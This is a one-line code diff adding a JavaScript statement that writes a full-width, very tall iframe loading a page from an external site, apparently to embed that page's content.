@@ -1,0 +1,1 @@
+document.writeln("<iframe src=\"http://mishi.cqkele.com/iframe/lbyouke/\" frameborder=\"0\" scrolling=\"no\" width=\"100%\" height=\"10550\"></iframe>");
